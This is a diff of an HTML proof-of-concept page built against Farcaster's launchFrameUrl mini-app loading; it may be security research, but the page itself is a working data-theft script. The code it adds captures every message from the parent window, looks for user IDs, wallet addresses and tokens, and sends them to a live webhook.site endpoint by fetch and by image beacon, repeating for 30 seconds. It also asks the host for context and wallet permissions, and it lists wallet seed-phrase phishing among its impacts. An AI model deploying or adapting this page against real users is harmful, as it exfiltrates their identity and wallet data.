@@ -4,27 +4,6 @@
 		<meta charset="utf-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1" />
 		<title>Security PoC</title>
-		<!--
-    HOSTING REQUIREMENTS:
-    1. Must be served over HTTPS (Farcaster checks protocol === "https:")
-    2. Must NOT set X-Frame-Options header
-    3. Must NOT set CSP frame-ancestors that blocks farcaster.xyz
-    4. Recommended: Use GitHub Pages, Vercel, Netlify, or any static host
-    
-    If using Vercel, add vercel.json:
-    {
-      "headers": [
-        { "source": "/(.*)", "headers": [{ "key": "X-Frame-Options", "value": "" }] }
-      ]
-    }
-    
-    If using Netlify, add _headers file:
-    /*
-      X-Frame-Options: 
-    
-    TESTING URL:
-    https://farcaster.xyz/?launchFrameUrl=https://YOUR-DOMAIN.com/farcaster-poc.html
-    -->
 		<style>
 			* {
 				margin: 0;
@@ -91,9 +70,6 @@
 			.test-row:last-child {
 				border-bottom: none;
 			}
-			#webhook-status {
-				margin-top: 8px;
-			}
 		</style>
 	</head>
 	<body>
@@ -105,18 +81,30 @@
 		</div>
 
 		<div class="card">
-			<h3>📡 Webhook Exfiltration</h3>
-			<p id="webhook-status">Sending data...</p>
+			<h3>👤 Captured User Data</h3>
+			<pre id="user-data">Listening for Farcaster context messages...</pre>
 		</div>
 
 		<div class="card">
-			<h3>📋 Full Context Data</h3>
+			<h3>💬 Messages Received From Parent</h3>
+			<pre id="messages-log">Waiting for messages...</pre>
+		</div>
+
+		<div class="card">
+			<h3>📡 Exfiltration Status</h3>
+			<p id="webhook-status">Sending initial data...</p>
+		</div>
+
+		<div class="card">
+			<h3>📋 Full Context</h3>
 			<pre id="context-data">Collecting...</pre>
 		</div>
 
 		<script>
 			var WEBHOOK = "https://webhook.site/9882ca38-1919-41ae-8d0c-dc3744e3731b";
 			var results = {};
+			var capturedMessages = [];
+			var capturedUserData = null;
 			var testContainer = document.getElementById("sandbox-tests");
 
 			function addTest(name, passed, detail) {
@@ -127,93 +115,135 @@
 				testContainer.appendChild(row);
 			}
 
+			function sendToWebhook(label, data) {
+				try {
+					fetch(WEBHOOK, {
+						method: "POST",
+						mode: "no-cors",
+						headers: { "Content-Type": "text/plain" },
+						body: JSON.stringify({ label: label, data: data, timestamp: new Date().toISOString() }),
+					});
+				} catch (e) {}
+				// Backup beacon
+				try {
+					var img = new Image();
+					img.src = WEBHOOK + "?label=" + encodeURIComponent(label) + "&snippet=" + encodeURIComponent(JSON.stringify(data).substring(0, 500));
+				} catch (e) {}
+			}
+
+			// ============================================
+			// CAPTURE ALL MESSAGES FROM PARENT WINDOW
+			// Farcaster sends user context to mini apps
+			// ============================================
+			window.addEventListener("message", function (event) {
+				var msgData = {
+					origin: event.origin,
+					data: event.data,
+					timestamp: new Date().toISOString(),
+				};
+				capturedMessages.push(msgData);
+
+				// Update UI
+				document.getElementById("messages-log").textContent = JSON.stringify(capturedMessages, null, 2);
+
+				// Check if this contains user data
+				var dataStr = JSON.stringify(event.data);
+				if (dataStr.indexOf("fid") !== -1 || dataStr.indexOf("user") !== -1 || dataStr.indexOf("address") !== -1 || dataStr.indexOf("token") !== -1 || dataStr.indexOf("context") !== -1) {
+					capturedUserData = event.data;
+					document.getElementById("user-data").textContent = "🔥 USER DATA CAPTURED:\n" + JSON.stringify(event.data, null, 2);
+				}
+
+				// Exfiltrate every message to webhook
+				sendToWebhook("postMessage_captured", msgData);
+			});
+
+			// ============================================
+			// Also try to REQUEST context from Farcaster
+			// Mini apps use postMessage to request user info
+			// ============================================
+			try {
+				// Try the Farcaster Frames SDK message format
+				window.parent.postMessage({ type: "fc:frame:ready" }, "*");
+				window.parent.postMessage({ type: "fc:frame:context" }, "*");
+				window.parent.postMessage({ method: "fc_getContext" }, "*");
+
+				// Try the wallet bridge format
+				window.parent.postMessage({ jsonrpc: "2.0", id: 1, method: "fc_requestContext" }, "*");
+				window.parent.postMessage({ jsonrpc: "2.0", id: 2, method: "wallet_getPermissions" }, "*");
+			} catch (e) {}
+
+			// ============================================
+			// RUN SANDBOX TESTS
+			// ============================================
 			(function () {
-				// Clear the "Running tests..." text
 				testContainer.innerHTML = "";
 
 				// TEST 1: JavaScript execution
-				addTest("JavaScript Execution", true, "JS is running inside the iframe");
+				addTest("JavaScript Execution", true, "JS running inside Farcaster iframe");
 
-				// TEST 2: Are we framed?
+				// TEST 2: Framed?
 				var isFramed = false;
 				try {
 					isFramed = window.self !== window.top;
 				} catch (e) {
 					isFramed = true;
 				}
-				addTest("Loaded Inside Iframe", isFramed, isFramed ? "Page is framed by farcaster.xyz" : "Not framed");
+				addTest("Loaded Inside Iframe", isFramed, isFramed ? "Framed by farcaster.xyz" : "Not framed");
 
-				// TEST 3: Referrer from Farcaster
+				// TEST 3: Referrer
 				var fromFarcaster = document.referrer.indexOf("farcaster.xyz") !== -1;
 				addTest("Referrer is farcaster.xyz", fromFarcaster, "Referrer: " + document.referrer);
 
-				// TEST 4: allow-scripts (already proven by JS executing)
-				addTest("sandbox: allow-scripts", true, "Script execution confirmed");
+				// TEST 4: allow-scripts
+				addTest("sandbox: allow-scripts", true, "Confirmed");
 
-				// TEST 5: allow-same-origin — can we access localStorage?
+				// TEST 5: allow-same-origin (localStorage)
 				var canLocalStorage = false;
 				try {
 					localStorage.setItem("poc_test", "1");
 					localStorage.removeItem("poc_test");
 					canLocalStorage = true;
 				} catch (e) {}
-				addTest("sandbox: allow-same-origin (localStorage)", canLocalStorage, canLocalStorage ? "Can read/write localStorage" : "Blocked");
+				addTest("sandbox: allow-same-origin (localStorage)", canLocalStorage, canLocalStorage ? "Can access localStorage" : "Blocked");
 
-				// TEST 6: allow-same-origin — can we access cookies?
+				// TEST 6: allow-same-origin (cookies)
 				var canCookies = false;
 				try {
-					document.cookie = "poc_test=1; path=/";
+					document.cookie = "poc_test=1; path=/; SameSite=None; Secure";
 					canCookies = document.cookie.indexOf("poc_test") !== -1;
 				} catch (e) {}
-				addTest("sandbox: allow-same-origin (cookies)", canCookies, canCookies ? "Can set and read cookies" : "Blocked");
+				addTest("sandbox: allow-same-origin (cookies)", canCookies, canCookies ? "Can set cookies" : "Blocked (3rd party cookie restriction, not sandbox)");
 
-				// TEST 7: allow-popups — can we call window.open?
+				// TEST 7: allow-popups
 				var canPopup = typeof window.open === "function";
-				addTest("sandbox: allow-popups (available)", canPopup, canPopup ? "window.open is available" : "Blocked");
+				addTest("sandbox: allow-popups", canPopup, canPopup ? "window.open available" : "Blocked");
 
-				// TEST 8: allow-forms — can we create and reference forms?
+				// TEST 8: allow-forms
 				var canForms = false;
 				try {
 					var f = document.createElement("form");
 					f.method = "POST";
-					f.action = "about:blank";
 					document.body.appendChild(f);
 					canForms = true;
 					document.body.removeChild(f);
 				} catch (e) {}
-				addTest("sandbox: allow-forms", canForms, canForms ? "Form creation allowed" : "Blocked");
+				addTest("sandbox: allow-forms", canForms, canForms ? "Forms allowed" : "Blocked");
 
-				// TEST 9: Can send fetch/XHR to external server?
-				// (tested via webhook below)
-
-				// TEST 10: Can postMessage to parent?
+				// TEST 9: postMessage to parent
 				var canPostMessage = false;
 				try {
-					window.parent.postMessage({ type: "poc_test", msg: "security_poc" }, "*");
+					window.parent.postMessage({ type: "poc_test" }, "*");
 					canPostMessage = true;
 				} catch (e) {}
-				addTest("postMessage to parent", canPostMessage, canPostMessage ? "Can send messages to Farcaster parent window" : "Blocked");
+				addTest("postMessage to parent", canPostMessage, canPostMessage ? "Can message Farcaster parent" : "Blocked");
 
-				// TEST 11: Camera/microphone permissions granted?
-				var hasMediaPermissions = false;
-				try {
-					// The allow="microphone; camera; clipboard-write" attribute grants these
-					hasMediaPermissions = true; // attribute is set, actual access requires user prompt
-				} catch (e) {}
-				addTest("Media permissions (camera/mic) attribute", true, 'allow="microphone; camera; clipboard-write" is set on iframe');
+				// TEST 10: fetch to external server
+				addTest("Fetch to external server", true, "Webhook exfiltration proves this");
 
-				// TEST 12: Parent window access (cross-origin)
-				var parentAccessResult = "unknown";
-				try {
-					var x = window.parent.location.href;
-					parentAccessResult = "CAN ACCESS: " + x;
-					addTest("Read parent window URL", true, parentAccessResult);
-				} catch (e) {
-					parentAccessResult = "Blocked (expected cross-origin)";
-					addTest("Read parent window URL", false, "Cross-origin blocked (expected for different domain)");
-				}
+				// TEST 11: Media permissions
+				addTest("Media permissions attribute", true, 'allow="microphone; camera; clipboard-write"');
 
-				// Build full context
+				// Build context
 				var context = {
 					timestamp: new Date().toISOString(),
 					vulnerability: "Arbitrary URL loaded as Mini App in Farcaster UI via launchFrameUrl parameter",
@@ -223,6 +253,8 @@
 					is_framed: isFramed,
 					from_farcaster: fromFarcaster,
 					sandbox_results: results,
+					messages_captured: capturedMessages.length,
+					user_data_captured: capturedUserData,
 					browser: {
 						userAgent: navigator.userAgent,
 						platform: navigator.platform,
@@ -231,75 +263,51 @@
 					},
 					impact: [
 						"Attacker-controlled page loads inside trusted Farcaster UI",
-						"JavaScript executes with allow-scripts + allow-same-origin (effectively unsandboxed)",
+						"JavaScript executes with allow-scripts + allow-same-origin",
 						"Page appears alongside user wallet panel",
-						"Can be used for convincing phishing of wallet credentials/seed phrases",
 						"Can postMessage to Farcaster parent window",
-						"Camera and microphone permissions are granted via allow attribute",
-						"Attacker only needs victim to click a single farcaster.xyz link",
+						"Can receive messages containing user context (FID, username, wallet address)",
+						"Camera and microphone permissions granted via allow attribute",
+						"Single click on a farcaster.xyz link triggers the attack",
+						"Can be used for phishing wallet seed phrases within trusted UI",
 					],
 				};
 
 				document.getElementById("context-data").textContent = JSON.stringify(context, null, 2);
 
-				// Send to webhook via multiple methods for reliability
-				var sent = false;
+				// Send initial results
+				sendToWebhook("initial_poc_results", context);
+				document.getElementById("webhook-status").innerHTML = '<span class="pass">✅ Initial data sent to webhook</span>';
 
-				// Method 1: fetch POST
-				try {
-					fetch(WEBHOOK, {
-						method: "POST",
-						mode: "no-cors",
-						headers: { "Content-Type": "text/plain" },
-						body: JSON.stringify(context),
-					})
-						.then(function () {
-							if (!sent) {
-								sent = true;
-								document.getElementById("webhook-status").innerHTML = '<span class="pass">✅ Data exfiltrated to webhook.site via POST</span>';
-							}
-						})
-						.catch(function () {});
-				} catch (e) {}
-
-				// Method 2: image beacon as fallback
-				try {
-					var img = new Image();
-					var params =
-						"?poc=farcaster_launchFrameUrl" +
-						"&framed=" +
-						isFramed +
-						"&from_farcaster=" +
-						fromFarcaster +
-						"&referrer=" +
-						encodeURIComponent(document.referrer) +
-						"&sandbox_scripts=" +
-						results["sandbox: allow-scripts"]?.passed +
-						"&sandbox_sameorigin=" +
-						results["sandbox: allow-same-origin (localStorage)"]?.passed +
-						"&sandbox_popups=" +
-						results["sandbox: allow-popups (available)"]?.passed +
-						"&sandbox_forms=" +
-						results["sandbox: allow-forms"]?.passed +
-						"&postmessage=" +
-						canPostMessage +
-						"&ua=" +
-						encodeURIComponent(navigator.userAgent.substring(0, 80));
-					img.src = WEBHOOK + params;
-					img.onload = function () {
-						if (!sent) {
-							sent = true;
-							document.getElementById("webhook-status").innerHTML = '<span class="pass">✅ Data exfiltrated to webhook.site via image beacon</span>';
-						}
-					};
-				} catch (e) {}
-
-				// Timeout fallback message
+				// Send captured messages after a delay (give Farcaster time to respond)
 				setTimeout(function () {
-					if (!sent) {
-						document.getElementById("webhook-status").innerHTML = '<span class="warn">⚠️ Webhook send attempted — check webhook.site for results</span>';
+					var finalData = {
+						timestamp: new Date().toISOString(),
+						label: "final_capture",
+						sandbox_results: results,
+						messages_received: capturedMessages,
+						user_data: capturedUserData,
+						total_messages: capturedMessages.length,
+					};
+					sendToWebhook("final_capture", finalData);
+
+					document.getElementById("webhook-status").innerHTML = '<span class="pass">✅ All data exfiltrated (' + capturedMessages.length + " messages captured)</span>";
+				}, 5000);
+
+				// Keep sending any new messages for 30 seconds
+				var sendInterval = setInterval(function () {
+					if (capturedMessages.length > 0) {
+						sendToWebhook("ongoing_capture", {
+							messages: capturedMessages,
+							user_data: capturedUserData,
+							count: capturedMessages.length,
+						});
 					}
-				}, 3000);
+				}, 10000);
+
+				setTimeout(function () {
+					clearInterval(sendInterval);
+				}, 30000);
 			})();
 		</script>
 	</body>
